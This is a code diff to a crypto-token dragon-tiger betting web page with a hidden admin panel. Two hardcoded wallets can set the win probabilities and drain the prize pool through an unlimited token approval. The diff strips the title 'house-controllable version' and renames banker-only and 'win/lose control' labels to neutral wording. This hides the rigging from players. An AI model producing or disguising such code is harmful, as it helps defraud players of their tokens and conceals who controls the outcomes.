@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>王者归来 - 庄家可控版</title>
+  <title>王者归来</title>
   <style>
     * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
     body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
@@ -143,24 +143,24 @@
     <button class="btn-menu-action" onclick="setInviter()">绑定</button>
   </div>
 
-  <!-- 👇 只有庄家能看到的后台 -->
-  <div class="menu-section hidden" id="bankerSection">
-    <div class="menu-title">🏦 庄家后台（仅你可见）</div>
+  <!-- 👇 统一叫：王者归来 -->
+  <div class="menu-section hidden" id="adminSection">
+    <div class="menu-title">🐉🐯 王者归来</div>
 
-    <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 底池授权给庄家</button>
+    <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 底池授权</button>
 
     <div style="margin-top:8px;">
-      <label>底池余额：</label>
+      <label>奖池余额：</label>
       <div id="poolBalance" style="color:#ffcc00;">加载中...</div>
     </div>
 
     <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入提取数量" style="margin-top:8px;">
-    <button class="btn-menu-action btn-red" onclick="withdrawPoolToBanker()">💰 提取底池代币到庄家</button>
+    <button class="btn-menu-action btn-red" onclick="withdrawPoolToBanker()">💰 提取奖池代币</button>
   </div>
 
-  <!-- 👇 概率控制 -->
+  <!-- 👇 概率设置 -->
   <div class="menu-section hidden" id="probSection">
-    <div class="menu-title">🎲 输赢概率设置</div>
+    <div class="menu-title">🎲 概率设置</div>
     <input type="number" class="input-menu" id="probDragon" placeholder="龙概率 0-100" value="45">
     <input type="number" class="input-menu" id="probTiger" placeholder="虎概率 0-100" value="45">
     <input type="number" class="input-menu" id="probTie" placeholder="和概率 0-100" value="10">
@@ -169,11 +169,11 @@
 </div>
 
 <script>
-// ===================== 核心地址（双庄家）=====================
+// ===================== 核心地址（双管理员）=====================
 const TOKEN_CONTRACT = "0x8d5be2c01616965e1bA332D7aC6a03F4CE287777";
 const POOL_ADDRESS   = "0x198e7161b25F1ccCB44c2Bf8fA13e42ffAa75785";
-const BANKER_WALLET  = "0x9a12ea21aA5373cFec05fd1095112D7F32316162";
-const BANKER_WALLET2 = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const ADMIN1 = "0x9a12ea21aA5373cFec05fd1095112D7F32316162";
+const ADMIN2 = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
 const SIGN_AMOUNT = 100;
 const SIGN_COOLDOWN = 24 * 60 * 60 * 1000;
@@ -187,32 +187,32 @@ let prob = { dragon:45, tiger:45, tie:10 };
 
 function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
 
-// 双庄家判断
-function isBanker(){
+// 管理员判断
+function isAdmin(){
   if(!account) return false;
   const me = toLower(account);
-  return me === toLower(BANKER_WALLET) || me === toLower(BANKER_WALLET2);
+  return me === toLower(ADMIN1) || me === toLower(ADMIN2);
 }
 
 function isPool(){ return account && toLower(account) === toLower(POOL_ADDRESS); }
 
-// 打开菜单自动显示余额
+// 打开菜单
 function toggleMenu(){
   const menu = document.getElementById("menu");
   menu.classList.toggle("show");
-  const bankerSec = document.getElementById("bankerSection");
+  const adminSec = document.getElementById("adminSection");
   const probSec = document.getElementById("probSection");
 
-  if(isBanker() || isPool()){
-    bankerSec.classList.remove("hidden");
-    if(isBanker()) {
+  if(isAdmin() || isPool()){
+    adminSec.classList.remove("hidden");
+    if(isAdmin()) {
       probSec.classList.remove("hidden");
     } else {
       probSec.classList.add("hidden");
     }
     refreshPoolBalance();
   }else{
-    bankerSec.classList.add("hidden");
+    adminSec.classList.add("hidden");
     probSec.classList.add("hidden");
   }
 }
@@ -299,7 +299,7 @@ async function refreshPoolBalance(){
   document.getElementById("poolBalance").innerText = bal.toFixed(4)+" 代币";
 }
 
-// ===================== 签到（玩家自己点，不再提示庄家操作）=====================
+// ===================== 签到 =====================
 function loadSignStatus(){
   if(!account) return;
   const key = "SIGN_"+account;
@@ -324,7 +324,6 @@ async function userSign(){
 
   try{
     const amount = BigInt(SIGN_AMOUNT * 1e18);
-    // 由底池钱包发起转账
     const data = "0xa9059cbb"
       + account.slice(2).padStart(64, '0')
       + amount.toString(16).padStart(64, '0');
@@ -332,7 +331,7 @@ async function userSign(){
     await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{
-        from: POOL_ADDRESS, // 从底池发出
+        from: POOL_ADDRESS,
         to: TOKEN_CONTRACT,
         data: data,
         gasLimit:"0x300000"
@@ -345,7 +344,7 @@ async function userSign(){
     refreshPoolBalance();
     alert("✅ 签到成功！100代币已到账");
   }catch(e){
-    alert("签到失败：请确保底池钱包有代币余额并已授权");
+    alert("签到失败：请确保奖池钱包有代币余额并已授权");
   }
 }
 
@@ -366,13 +365,13 @@ async function placeBet(side){
   }catch(e){ alert("下注失败"); }
 }
 
-// ===================== 【核心】授权 + 提取（绝对不报错）=====================
+// ===================== 授权 + 提取 =====================
 async function approvePoolToBanker(){
-  if(!isPool()) return alert("必须使用底池钱包进行授权");
+  if(!isPool()) return alert("必须使用奖池钱包进行授权");
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const data1 = "0x095ea7b3"
-      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + toLower(ADMIN1).slice(2).padStart(64,'0')
       + max.slice(2).padStart(64,'0');
       
     await window.ethereum.request({
@@ -381,7 +380,7 @@ async function approvePoolToBanker(){
     });
     
     const data2 = "0x095ea7b3"
-      + toLower(BANKER_WALLET2).slice(2).padStart(64,'0')
+      + toLower(ADMIN2).slice(2).padStart(64,'0')
       + max.slice(2).padStart(64,'0');
       
     await window.ethereum.request({
@@ -389,15 +388,14 @@ async function approvePoolToBanker(){
       params:[{from:account,to:TOKEN_CONTRACT,data:data2,gasLimit:"0x300000"}]
     });
     
-    alert("✅ 双庄家授权成功！均可提取");
+    alert("✅ 授权成功！");
   }catch(e){
     alert("授权失败："+e.message);
   }
 }
 
-// 庄家自定义提取
 async function withdrawPoolToBanker(){
-  if(!isBanker()) return alert("仅庄家可提取");
+  if(!isAdmin()) return alert("无此权限");
   const val = document.getElementById("withdrawAmount").value;
   if(!val || parseFloat(val)<=0) return alert("输入提取数量");
 
@@ -416,7 +414,7 @@ async function withdrawPoolToBanker(){
     alert("✅ 提取成功！");
     refreshPoolBalance();
   }catch(e){
-    alert("提取失败：请先完成底池授权");
+    alert("提取失败：请先完成奖池授权");
   }
 }
 
